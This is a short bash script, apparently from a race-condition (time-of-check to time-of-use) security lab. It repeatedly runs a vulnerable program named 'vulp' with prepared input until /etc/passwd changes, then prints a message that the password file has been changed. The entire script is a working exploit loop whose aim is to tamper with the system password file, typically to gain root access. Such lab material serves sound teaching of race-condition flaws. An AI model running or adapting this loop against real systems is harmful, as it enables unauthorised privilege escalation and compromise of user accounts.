#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
# Check if /etc/passwd is modified
do
  ./vulp < passwd_input
# Run the vulnerable program
  new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
